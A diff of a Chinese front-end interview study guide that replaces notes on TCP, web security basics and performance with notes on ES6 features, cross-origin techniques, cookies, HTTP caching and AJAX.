+箭头函数没有原本(传统)的函数有的隐藏arguments对象。
+箭头函数不能当作generators使用，使用yield会产生错误。
+
+在以下场景中不要使用箭头函数去定义：
+
+- 定义对象方法、定义原型方法、定义构造函数、定义事件回调函数。
+- 箭头函数里不但没有 this，也没有 arguments, super ……
+
+#### Symbol，Map和Set
+
+Map 对象保存键值对。一个对象的键只能是字符串或者 Symbols，但一个 Map 的键可以是任意值。
+Set 对象允许你存储任何类型的唯一值，Set对象是值的集合，Set中的元素只会出现一次
+Symbol 是一种特殊的、不可变的数据类型，可以作为对象属性的标识符使用(Symbol([description]) )
+
+```javascript
+let mySet = new Set()
+mySet.add(1)
+mySet.add('hello')
+mySet.add('hello')
+console.log(mySet.size);//2
+console.log(mySet);//Set {1,'hello'}
+
+//Map保存键值对也不能有重复的
+let myMap = new Map();
+let key1 = 'China',key2 = 'America';
+myMap.set(key1,'welcome')
+myMap.set(key2,'gold bless you')
+console.log(myMap);//Map { 'China' => 'welcome', 'America' => 'gold bless you' }
+console.log(myMap.get(key1));//welcome
+console.log(myMap.get(key2));//gold bless you
+
+let mySymbol = Symbol('symbol1');
+let mySymbol2 = Symbol('symbol1');
+console.log(mySymbol == mySymbol2);//false
+//Symbols 在 for...in 迭代中不可枚举。
+let obj = {}
+obj['c'] = 'c'
+obj.d ='d'
+obj[Symbol('a')] = 'a'
+obj[Symbol.for('b')] = 'b'
+for(let k in obj){
+    console.log(k);//logs 'c' and 'd'
+}
 ```
 
-#### 说说TCP传输的三次握手四次挥手策略
+`for...of`可以用来遍历数组，类数组对象，字符串，Map和Set，`for...in`用来遍历对象，arguments本身不是可迭代对象，不能用for...of遍历
+### 跨域
 
- 为了准确无误地把数据送达目标处，`TCP`协议采用了三次握手策略。用TCP协议把数据包送出去后，`TCP`不会对传送    后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志：`SYN`和`ACK`。
+常用的几种跨域方案，并对比其优劣势（p6）
 
-发送端首先发送一个带`SYN`标志的数据包给对方。接收端收到后，回传一个带有`SYN/ACK`标志的数据包以示传达确认信息。
-最后，发送端再回传一个带`ACK`标志的数据包，代表“握手”结束。
-若在握手过程中某个阶段莫名中断，`TCP`协议会再次以相同的顺序发送相同的数据包。
+script、image、iframe的src都不受同源策略的影响。
 
+1、JSONP,回调函数+数据就是 JSON With Padding，简单、易部署。（做法：动态插入script标签，设置其src属性指向提供JSONP服务的URL地址，查询字符串中加入 callback 指定回调函数，返回的 JSON 被包裹在回调函数中以字符串的形式被返回，需将script标签插入body底部）。缺点是只支持GET，不支持POST（原因是通过地址栏传参所以只能使用GET）
+2、document.domain 跨子域 （ 例如a.qq.com嵌套一个b.qq.com的iframe ，如果a.qq.com设置document.domain为qq.com 。b.qq.com设置document.domain为qq.com， 那么他俩就能互相通信了，不受跨域限制了。 注意：只能跨子域）
+3、window.name + iframe ==> http://www.tuicool.com/articles/viMFbqV，支持跨主域。不支持POST
+4、HTML5的postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。适用于不同窗口iframe之间的跨域
 
-
-<br>
-
->断开一个TCP连接则需要“四次握手”：
-
-- 第一次挥手：主动关闭方发送一个`FIN`，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。
-
-- 第二次挥手：被动关闭方收到`FIN`包后，发送一个`ACK`给对方，确认序号为收到序号`+1`（与`SYN`相同，一个`FIN`占用一个序号）。
-
-- 第三次挥手：被动关闭方发送一个`FIN`，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。
-
-- 第四次挥手：主动关闭方收到`FIN`后，发送一个`ACK`给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。
+5、CORS（Cross Origin Resource Share）对方服务端设置响应头
+6、服务端代理
+在浏览器客户端不能跨域访问，而服务器端调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就没有跨越问题。简单地说，就是浏览器不能跨域，后台服务器可以跨域。（一种是通过http-proxy-middleware插件设置后端代理；另一种是通过使用http模块发出请求）
 
 
-#### TCP和UDP的区别
+CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定`Access-Control-Allow-Credentials`字段。
 
-`TCP`（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个`TCP`连接必须要经过三次“对话”才能建立起来
+### fetch和Ajax有什么不同
 
-`UDP`（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！
-  UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。
+`XMLHttpRequest` 是一个设计粗糙的 API，不符合关注分离（Separation of Concerns）的原则，配置和调用方式非常混乱，而且基于事件的异步模型写起来也没有现代的 Promise，`generator/yield`，`async/await` 友好。
 
+fetch 是浏览器提供的一个新的 web API，它用来代替 Ajax（XMLHttpRequest），其提供了更优雅的接口，更灵活强大的功能。
+Fetch 优点主要有：
 
-#### 说说你对作用域链的理解
+- 语法简洁，更加语义化
+- 基于标准 Promise 实现，支持 `async/await`
 
-作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到`window`对象即被终止，作用域链向下访问变量是不被允许的。
-
-
-#### 创建ajax过程
-
-```js
-(1)创建XMLHttpRequest对象,也就是创建一个异步调用对象.
-
-(2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息.
-
-(3)设置响应HTTP请求状态变化的函数.
-
-(4)发送HTTP请求.
-
-(5)获取异步调用返回的数据.
-
-(6)使用JavaScript和DOM实现局部刷新.
+```javascript
+fetch(url).then(response => response.json())
+  .then(data => console.log(data))
+  .catch(e => console.log("Oops, error", e))
 ```
 
-#### 渐进增强和优雅降级
+### Cookie相关
 
-渐进增强 ：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。
-
-
-
-优雅降级 ：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。
-
-
-
-#### 常见web安全及防护原理
-
->sql注入原理
-
-就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
-
-总的来说有以下几点：
-
+```javascript
+Set-Cookie: value[; expires=date][; domain=domain][; path=path][; secure]
 ```
 
-    1.永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双"-"进行转换等。
+如果想让cookie存在一段时间，就要为expires属性设置为未来的一个用毫秒数表示的过期日期或时间点，expires默认为设置的expires的当前时间。现在已经被max-age属性所取代，max-age用秒来设置cookie的生存期。如果max-age为0，则表示删除该cookie。
 
-    2.永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。
+cookie的属性：
 
-    3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。
+- HttpOnly属性告之浏览器该 cookie 绝不能通过 JavaScript 的 `document.cookie` 属性访问。
+- domain属性可以使多个web服务器共享cookie。
+- 只有path属性匹配向服务器发送的路径，Cookie 才会发送。必须是绝对路径
+- secure属性用来指定Cookie只能在加密协议HTTPS下发送到服务器。
+- max-age属性用来指定Cookie有效期
+- expires属性用于指定Cookie过期时间。它的格式采用Date.toUTCString()的格式。
 
-    4.不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。
+浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享Cookie。
+
+### 异步
+
+有许多场景是异步的：
+1.事件监听，如click，onload等事件
+2.定时器  setTimeout和setInterval
+3.ajax请求
+
+js异步编程模型（es5）：
+
+- 回调函数（callback）陷入回调地狱，解耦程度特别低
+- 事件监听（Listener）JS 和浏览器提供的原生方法基本都是基于事件触发机制的
+- 发布/订阅（观察者模式）把事件全部交给控制器管理，可以完全掌握事件被订阅的次数，以及订阅者的信息，管理起来特别方便。
+- Promise 对象实现方式
+
+async函数与Promise、Generator函数一样，是用来取代回调函数、解决异步操作的一种方法。它本质上是Generator函数的语法糖。
+Promise，generator/yield，await/async 都是现在和未来 JS 解决异步的标准做法
+
+### 什么是同构
+
+同构(isomorphic/universal)就是使前后端运行同一套代码的意思，后端一般是指 NodeJS 环境。
+
+
+### http2.0和https
+
+与HTTP/1相比，主要区别包括
+
+- HTTP/2采用二进制格式而非文本格式（二进制协议解析起来更高效）
+- HTTP/2是完全多路复用的，即一个TCP连接上同时跑多个HTTP请求
+- 使用报头压缩，HTTP/2降低了开销
+- HTTP/2让服务器可以将响应主动“推送”到客户端缓存中，支持服务端推送（就是服务器可以对一个客户端请求发送多个响应）
+
+
+HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，TLS/SSL中使用 了非对称加密，对称加密以及HASH算法。比http协议安全。
+
+- HTTPS的工作原理
+
+HTTPS 在传输数据之前需要客户端（浏览器）与服务端（网站）之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息
+
+ - 什么是keep-alive模式 （持久连接，连接重用）
+
+keep-alive使客户端到服务端的连接持久有效，当出现对服务器的后继请求时，keep-alive功能避免了建立或者重新连接
+
+不需要重新建立tcp的三次握手，就是说不释放连接
+
+http1.0默认关闭，http1.1默认启用
+
+优点：更高效，性能更高。因为避免了建立/释放连接的开销
+
+
+3.http1.0和http1.1区别：
+* 缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since，Expires来做为缓存判断的标准，HTTP1.1则引入更多缓存控制策略，例如Entity tag,If-Match,If-None-Match等
+* Http1.1支持长连接和请求的流水线（pipeline）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，默认开启Connection:keep-alive
+
+
+
+### async和defer
+
+defer 与 async 的相同点是采用并行下载，在下载过程中不会产生阻塞。区别在于执行时机，async 是加载完成后自动执行，而 defer 需要等待页面完成后执行。
+
+
+
+### 说说观察者模式
+
+JS里对观察者模式的实现是通过回调来实现的，，它定义了一种一对多的关系，让多个观察者对象同时监听某一个主题对象
+
+观察者模式：对程序中某一个对象的进行实时的观察，当该对象状态发生改变的时候 进行通知
+
+我们为什么要用观察者模式呢，主要是可以实现松散耦合的代码，什么意思？就是
+主体和订阅者之间是相互独立的，其二者可以独立运行。
+
+### es6 module和require/exports/module.exports的区别
+
+ES6 Module 中导入模块的属性或者方法是强绑定的，包括基础类型；而 CommonJS 则是普通的值传递或者引用传递。
+
+CommonJS模块是运行时的，导入导出是通过值的复制来达成的。ES6的模块是静态的，导入导出实际上是建立符号的映射
+
+
+import必须放在文件最顶部，require不需要；import最终会被babel编译为require
+
+
+
+### GET,POST,PUT,Delete
+
+1.GET请求会向数据库获取信息，只是用来查询数据，不会修改，增加数据。使用URL传递参数，对所发送的数量有限制，一般在2000字符
+2.POST向服务器发送数据，会改变数据的种类等资源，就像insert操作一样，会创建新的内容，大小一般没有限制，POST安全性高，POST不会被缓存
+3.PUT请求就像数据库的update操作一样，用来修改数据内容，不会增加数据种类
+4.Delete用来删除操作
+
+- GET和POST的区别
+
+1. GET使用URL或Cookie传参，而POST将数据放在BODY中，这个是因为HTTP协议用法的约定。并非它们的本身区别。
+
+2. GET方式提交的数据有长度限制，则POST的数据则可以非常大，这个是因为它们使用的操作系统和浏览器设置的不同引起的区别。也不是GET和POST本身的区别。
+
+3. POST比GET安全，因为数据在地址栏上不可见，这个说法没毛病，但依然不是GET和POST本身的区别。
+
+GET和POST最大的区别主要是GET请求是幂等性的，POST请求不是。（幂等性：对同一URL的多个请求应该返回同样的结果。）因为get请求是幂等的，在网络不好的隧道中会尝试重试。如果用get请求增数据，会有重复操作的风险，而这种重复操作可能会导致副作用
+
+### 缓存相关
+
+1.浏览器输入 url 之后敲下回车，刷新 F5 与强制刷新(Ctrl + F5)，又有什么区别？
+
+实际上浏览器输入 url 之后敲下回车就是先看本地 cache-control、expires 的情况，刷新(F5)就是忽略先看本地 cache-control、expires 的情况，带上条件 If-None-Match、If-Modified-Since，强制刷新(Ctrl + F5)就是不带条件的访问。
+
+2.etag，cache-control，last-modified
+
+如果比较粗的说先后顺序应该是这样：
+
+- Cache-Control —— 请求服务器之前
+- Expires —— 请求服务器之前
+- If-None-Match (Etag) —— 请求服务器
+- If-Modified-Since (Last-Modified) —— 请求服务器
+
+需要注意的是 如果同时有 etag 和 last-modified 存在，在发送请求的时候会一次性的发送给服务器，没有优先级，服务器会比较这两个信息.
+
+如果expires和cache-control:max-age同时存在，expires会被cache-control 覆盖。
+
+其中Expires和cache-control属于强缓存，last-modified和etag属于协商缓存
+强缓存与协商缓存区别：强缓存不发请求到服务器，协商缓存会发请求到服务器。
+
+
+
+
+
+### babel的原理
+
+
+
+使用 babylon 解析器对输入的源代码字符串进行解析并生成初始 AST
+遍历 AST 树并应用各 transformers（plugin） 生成变换后的 AST 树
+利用 babel-generator 将 AST 树输出为转码后的代码字符串
+分为三个阶段：
+
+解析：将代码字符串解析成抽象语法树
+变换：对抽象语法树进行变换操作
+再建：根据变换后的抽象语法树再生成代码字符串
+
+###  ajax请求和原理
+
+```javascript
+var xhr = new XMLHTTPRequest();
+// 请求 method 和 URI
+xhr.open('GET', url);
+// 请求内容
+xhr.send();
+// 响应状态
+xhr.status
+// xhr 对象的事件响应
+xhr.onreadystatechange = function() {}
+xhr.readyState
+// 响应内容
+xhr.responseText
 ```
+- AJAX的工作原理
 
->XSS原理及防范
+Ajax的工作原理相当于在用户和服务器之间加了—个中间层(AJAX引擎),使用户操作与服务器响应异步化。　Ajax的原理简单来说通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。
 
-Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意 `html`标签或者`javascript`代码。比如：攻击者在论坛中放一个
+- ajax优缺点
 
-看似安全的链接，骗取用户点击后，窃取`cookie`中的用户私密信息；或者攻击者在论坛中加一个恶意表单，
-
-当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。
-
-
-
->XSS防范方法
-
-首先代码里对用户输入的地方和变量都需要仔细检查长度和对`”<”,”>”,”;”,”’”`等字符做过滤；其次任何内容写到页面之前都必须加以`encode`，避免不小心把`html tag` 弄出来。这一个层面做好，至少可以堵住超过一半的`XSS` 攻击。
-
-
-首先，避免直接在`cookie` 中泄露用户隐私，例如email、密码等等。
-
-
-其次，通过使`cookie` 和系统`ip` 绑定来降低`cookie` 泄露后的危险。这样攻击者得到的`cookie` 没有实际价值，不可能拿来重放。
-
-
-如果网站不需要再浏览器端对`cookie` 进行操作，可以在`Set-Cookie` 末尾加上`HttpOnly` 来防止`javascript` 代码直接获取`cookie` 。
-
-
-尽量采用`POST` 而非`GET` 提交表单
-
-
-
->XSS与CSRF有什么区别吗？
-
-`XSS`是获取信息，不需要提前知道其他用户页面的代码和数据包。`CSRF`是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。
-
-
-要完成一次`CSRF`攻击，受害者必须依次完成两个步骤：
-
-```
-登录受信任网站A，并在本地生成Cookie。
-
-在不登出A的情况下，访问危险网站B。
-```
-
-
->CSRF的防御
-
-- 服务端的`CSRF`方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。
-
-- 通过验证码的方法
-
-
-#### Web Worker 和webSocket
-
->worker主线程:
-
-
-```js
-    1.通过 worker = new Worker( url ) 加载一个JS文件来创建一个worker，同时返回一个worker实例。
-
-    2.通过worker.postMessage( data ) 方法来向worker发送数据。
-
-    3.绑定worker.onmessage方法来接收worker发送过来的数据。
-
-    4.可以使用 worker.terminate() 来终止一个worker的执行。
-```
-
-`WebSocket`是`Web`应用程序的传输协议，它提供了双向的，按序到达的数据流。他是一个`HTML5`协议，`WebSocket`的连接是持久的，他通过在客户端和服务器之间保持双工连接，服务器的更新可以被及时推送给客户端，而不需要客户端以一定时间间隔去轮询。
-
-
-
-#### HTTP和HTTPS
-
-`HTTP`协议通常承载于TCP协议之上，在`HTTP`和`TCP`之间添加一个安全协议层（`SSL`或`TSL`），这个时候，就成了我们常说的HTTPS。
-
-
-默认HTTP的端口号为80，`HTTPS`的端口号为443。
-
-
-
-#### 为什么`HTTPS`安全
-
-因为网络请求需要中间有很多的服务器路由器的转发。中间的节点都可能篡改信息，而如果使用`HTTPS`，密钥在你和终点站才有。`https`之所以比`http`安全，是因为他利用`ssl/tls`协议传输。它包含证书，卸载，流量转发，负载均衡，页面适配，浏览器适配，refer传递等。保障了传输过程的安全性
-
-
-
-#### 对前端模块化的认识
-
-
-
->AMD 是 `RequireJS` 在推广过程中对模块定义的规范化产出。
-
->CMD 是 `SeaJS` 在推广过程中对模块定义的规范化产出。
-
-
-
-`AMD` 是提前执行，`CMD` 是延迟执行。
-
-`AMD`推荐的风格通过返回一个对象做为模块对象，`CommonJS`的风格通过对`module.exports`或`exports`的属性赋值来达到暴露模块对象的目的。
-
-
-
->CMD模块方式
-
-
-```js
-    define(function(require, exports, module) {
-
-      // 模块代码
-
-    });
-```
-
-
-#### Javascript垃圾回收方法
-
->标记清除（mark and sweep）
-
-这是JavaScript最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境”。
-
-垃圾回收器会在运行的时候给存储在内存中的所有变量加上标记，然后去掉环境中的变量以及被环境中变量所引用的变量（闭包），在这些完成之后仍存在标记的就是要删除的变量了
-
->引用计数(reference counting)
-
-在低版本IE中经常会出现内存泄露，很多时候就是因为其采用引用计数方式进行垃圾回收。引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。
-
-
-在IE中虽然`JavaScript`对象通过标记清除的方式进行垃圾回收，但BOM与DOM对象却是通过引用计数回收垃圾的，
-也就是说只要涉及`BOM`及DOM就会出现循环引用问题。
-
-
-
-#### 你觉得前端工程的价值体现在哪
-
-
-
-    为简化用户使用提供技术支持（交互部分）
-
-    为多个浏览器兼容性提供支持
-
-    为提高用户浏览速度（浏览器性能）提供支持
-
-    为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持
-
-    为展示数据提供支持（数据接口）
-
-
-
-#### 谈谈性能优化问题
-
-
-
-代码层面：避免使用css表达式，避免使用高级选择器，通配选择器。
-
-缓存利用：缓存Ajax，使用CDN，使用外部js和css文件以便缓存，添加Expires头，服务端配置Etag，减少DNS查找等
-
-请求数量：合并样式和脚本，使用css图片精灵，初始首屏之外的图片资源按需加载，静态资源延迟加载。
-
-请求带宽：压缩文件，开启GZIP，
-
-
-
->代码层面的优化
-
-
-
-- 用`hash-table`来优化查找
-
-- 少用全局变量
-
-- 用`innerHTML`代替`DOM`操作，减少`DOM`操作次数，优化`javascript`性能
-
-- 用`setTimeout`来避免页面失去响应
-
-- 缓存DOM节点查找的结果
-
-- 避免使用CSS Expression
-
-- 避免全局查询
-
-- 避免使用with(with会创建自己的作用域，会增加作用域链长度)
-
-- 多个变量声明合并
-
-- 避免图片和iFrame等的空Src。空Src会重新加载当前页面，影响速度和效率
-- 尽量避免写在HTML标签中写Style属性
-
-#### 移动端性能优化
-
-- 尽量使用css3动画，开启硬件加速。
-- 适当使用`touch`事件代替`click`事件。
-- 避免使用`css3`渐变阴影效果。
-- 可以用`transform: translateZ(0)`来开启硬件加速。
-- 不滥用Float。Float在渲染时计算量比较大，尽量减少使用
-- 不滥用Web字体。Web字体需要下载，解析，重绘当前页面，尽量减少使用。
-- 合理使用requestAnimationFrame动画代替setTimeout
-- CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加
-- PC端的在移动端同样适用
-
->相关阅读：[如何做到一秒渲染一个移动页面](https://github.com/cssmagic/blog/issues/20)
-
-
-#### 什么是Etag？
-
-
-当发送一个服务器请求时，浏览器首先会进行缓存过期判断。浏览器根据缓存过期时间判断缓存文件是否过期。<br>
-
-情景一：若没有过期，则不向服务器发送请求，直接使用缓存中的结果，此时我们在浏览器控制台中可以看到  `200 OK`(from cache) ，此时的情况就是完全使用缓存，浏览器和服务器没有任何交互的。
-
-
-情景二：若已过期，则向服务器发送请求，此时请求中会带上①中设置的文件修改时间，和`Etag`
-
-
-
-然后，进行资源更新判断。服务器根据浏览器传过来的文件修改时间，判断自浏览器上一次请求之后，文件是不是没有被修改过；根据`Etag`，判断文件内容自上一次请求之后，有没有发生变化
-
-情形一：若两种判断的结论都是文件没有被修改过，则服务器就不给浏览器发`index.html`的内容了，直接告诉它，文件没有被修改过，你用你那边的缓存吧—— `304 Not Modified`，此时浏览器就会从本地缓存中获取`index.html`的内容。此时的情况叫协议缓存，浏览器和服务器之间有一次请求交互。<br>
-
-情形二：若修改时间和文件内容判断有任意一个没有通过，则服务器会受理此次请求，之后的操作同①
-
-<br>
-
-① 只有get请求会被缓存，post请求不会
-
-
-#### Expires和Cache-Control
-
-
-
-`Expires`要求客户端和服务端的时钟严格同步。`HTTP1.1`引入`Cache-Control`来克服Expires头的限制。如果max-age和Expires同时出现，则max-age有更高的优先级。
-
-
-```js
-    Cache-Control: no-cache, private, max-age=0
-
-    ETag: abcde
-
-    Expires: Thu, 15 Apr 2014 20:00:00 GMT
-
-    Pragma: private
-
-    Last-Modified: $now // RFC1123 format
-```
-
-
-#### ETag应用:
-
-
-`Etag`由服务器端生成，客户端通过`If-Match`或者说`If-None-Match`这个条件判断请求来验证资源是否修改。常见的是使用`If-None-Match`。请求一个文件的流程可能如下：
-
-====第一次请求===
-
-
-    1.客户端发起 HTTP GET 请求一个文件；
-
-    2.服务器处理请求，返回文件内容和一堆Header，当然包括Etag(例如"2e681a-6-5d044840")(假设服务器支持Etag生成和已经开启了Etag).状态码200
-
-
-
-====第二次请求===
-
-
-
-    客户端发起 HTTP GET 请求一个文件，注意这个时候客户端同时发送一个If-None-Match头，这个头的内容就是第一次请求时服务器返回的Etag：2e681a-6-5d0448402.服务器判断发送过来的Etag和计算出来的Etag匹配，因此If-None-Match为False，不返回200，返回304，客户端继续使用本地缓存；流程很简单，问题是，如果服务器又设置了Cache-Control:max-age和Expires呢，怎么办
-
-
-答案是同时使用，也就是说在完全匹配`If-Modified-Since`和`If-None-Match`即检查完修改时间和`Etag`之后，
-
-服务器才能返回304.(不要陷入到底使用谁的问题怪圈)
-
-
-
-为什么使用Etag请求头?
-
-Etag 主要为了解决 `Last-Modified` 无法解决的一些问题。
-
-
-
-#### 栈和队列的区别?
-
-
-
-    栈的插入和删除操作都是在一端进行的，而队列的操作却是在两端进行的。
-
-    队列先进先出，栈先进后出。
-
-    栈只允许在表尾一端进行插入和删除，而队列只允许在表尾一端进行插入，在表头一端进行删除
-
-
-
-#### 栈和堆的区别？
-
-    栈区（stack）—   由编译器自动分配释放   ，存放函数的参数值，局部变量的值等。
-
-    堆区（heap）   —   一般由程序员分配释放，   若程序员不释放，程序结束时可能由OS回收。
-
-    堆（数据结构）：堆可以被看成是一棵树，如：堆排序；
-
-    栈（数据结构）：一种先进后出的数据结构。
-
-
-#### 快速 排序的思想并实现一个快排？
-
-
-
-"快速排序"的思想很简单，整个排序过程只需要三步：
-
-　　（1）在数据集之中，找一个基准点
-
-　　（2）建立两个数组，分别存储左边和右边的数组
-
-　　（3）利用递归进行下次比较
-
-
-```js
-    <script type="text/javascript">
-
-        function quickSort(arr){
-            if(arr.length<=1){
-                return arr;//如果数组只有一个数，就直接返回；
-            }
-
-            var num = Math.floor(arr.length/2);//找到中间数的索引值，如果是浮点数，则向下取整
-
-            var numValue = arr.splice(num,1);//找到中间数的值
-            var left = [];
-            var right = [];
-
-            for(var i=0;i<arr.length;i++){
-                if(arr[i]<numValue){
-                    left.push(arr[i]);//基准点的左边的数传到左边数组
-                }
-                else{
-                   right.push(arr[i]);//基准点的右边的数传到右边数组
-                }
-            }
-
-            return quickSort(left).concat([numValue],quickSort(right));//递归不断重复比较
-        }
-
-        alert(quickSort([32,45,37,16,2,87]));//弹出“2,16,32,37,45,87”
-
-    </script>
-```
-
-
-#### 你觉得jQuery或zepto源码有哪些写的好的地方
-
-(答案仅供参考)
-
-`jquery`源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入window对象参数，可以使window对象作为局部变量使用，好处是当`jquery`中访问window对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问`window`对象。同样，传入`undefined`参数，可以缩短查找undefined时的作用域链。
-
-
-
-
-```js
-    (function( window, undefined ) {
-
-         //用一个函数域包起来，就是所谓的沙箱
-
-         //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局
-
-         //把当前沙箱需要的外部变量通过函数参数引入进来
-
-         //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数
-
-        window.jQuery = window.$ = jQuery;
-
-    })( window );
-```
-
-
-jquery将一些原型属性和方法封装在了`jquery.prototype`中，为了缩短名称，又赋值给了`jquery.fn`，这是很形象的写法。
-
-
-
-有一些数组或对象的方法经常能使用到，jQuery将其保存为局部变量以提高访问速度。
-
-
-
-
-`jquery`实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率。
-
-
-
-#### ES6的了解
-
-新增模板字符串（为JavaScript提供了简单的字符串插值功能）、箭头函数（操作符左边为输入的参数，而右边则是进行的操作以及返回的值`Inputs=>outputs`。）、`for-of`（用来遍历数据—例如数组中的值。）`arguments`对象可被不定参数和默认参数完美代替。`ES6`将`promise`对象纳入规范，提供了原生的`Promise`对象。增加了`let`和`const`命令，用来声明变量。增加了块级作用域。let命令实际上就增加了块级作用域。ES6规定，`var`命令和`function`命令声明的全局变量，属于全局对象的属性；`let`命令、`const`命令、`class`命令声明的全局变量，不属于全局对象的属性。。还有就是引入`module`模块的概念
-
-
-
-#### js继承方式及其优缺点
-
-
-
->原型链继承的缺点
-
-
-    一是字面量重写原型会中断关系，使用引用类型的原型，并且子类型还无法给超类型传递参数。
-
-
->借用构造函数（类式继承）
-
-
-
-    借用构造函数虽然解决了刚才两种问题，但没有原型，则复用无从谈起。所以我们需要原型链+借用构造函数的模式，这种模式称为组合继承
-
-
-
->组合式继承
-
-
-
-    组合式继承是比较常用的一种继承方法，其背后的思路是 使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承。这样，既通过在原型上定义方法实现了函数复用，又保证每个实例都有它自己的属性。
-
-具体请看：[JavaScript继承方式详解](http://segmentfault.com/a/1190000002440502)
-
-
-
-#### 关于Http 2.0 你知道多少？
-
-
-
-`HTTP/2`引入了“服务端推（server push）”的概念，它允许服务端在客户端需要数据之前就主动地将数据发送到客户端缓存中，从而提高性能。
-
-`HTTP/2`提供更多的加密支持
-
-`HTTP/2`使用多路技术，允许多个消息在一个连接上同时交差。
-
-它增加了头压缩（header compression），因此即使非常小的请求，其请求和响应的`header`都只会占用很小比例的带宽。
-
-
-
-<br>
-#### defer和async
->defer并行加载js文件，会按照页面上script标签的顺序执行
->async并行加载js文件，下载完成立即执行，不会按照页面上script标签的顺序执行
-
-
-
-#### 谈谈浮动和清除浮动
-
-浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上。
-
-
-
-#### 如何评价AngularJS和BackboneJS
-
-`backbone`具有依赖性，依赖`underscore.js`。`Backbone + Underscore + jQuery(or Zepto)` 就比一个`AngularJS` 多出了2 次HTTP请求.
-
-<br>
-
-`Backbone`的`Model`没有与UI视图数据绑定，而是需要在View中自行操作DOM来更新或读取UI数据。`AngularJS`与此相反，Model直接与UI视图绑定，`Model`与UI视图的关系，通过`directive`封装，`AngularJS`内置的通用`directive`，就能实现大部分操作了，也就是说，基本不必关心`Model`与UI视图的关系，直接操作Model就行了，UI视图自动更新。
-
-<br>
-
-`AngularJS`的`directive`，你输入特定数据，他就能输出相应UI视图。是一个比较完善的前端MVW框架，包含模板，数据双向绑定，路由，模块化，服务，依赖注入等所有功能，模板功能强大丰富，并且是声明式的，自带了丰富的 Angular 指令。
-
-
-
-#### 用过哪些设计模式？
-
-
-
->工厂模式：
-
-    主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复。
-
-        工厂模式解决了重复实例化的问题 ，但还有一个问题,那就是识别问题，因为根本无法 搞清楚他们到底是哪个对象的实例。
-
-
-    function createObject(name,age,profession){//集中实例化的函数var obj = new Object();
-        obj.name = name;
-        obj.age = age;
-        obj.profession = profession;
-        obj.move = function () {
-            return this.name + ' at ' + this.age + ' engaged in ' + this.profession;
-        };
-        return obj;
-    }
-    var test1 = createObject('trigkit4',22,'programmer');//第一个实例var test2 = createObject('mike',25,'engineer');//第二个实例
-
-
-<br>
-
-
-
->构造函数模式
-
-
-使用构造函数的方法 ，即解决了重复实例化的问题 ，又解决了对象识别的问题，该模式与工厂模式的不同之处在于：
-
-
-
-    1.构造函数方法没有显示的创建对象 (new Object());
-
-    2.直接将属性和方法赋值给 this 对象;
-
-    3.没有 renturn 语句。
-
-
-
-
-#### 说说你对闭包的理解
-
-
-
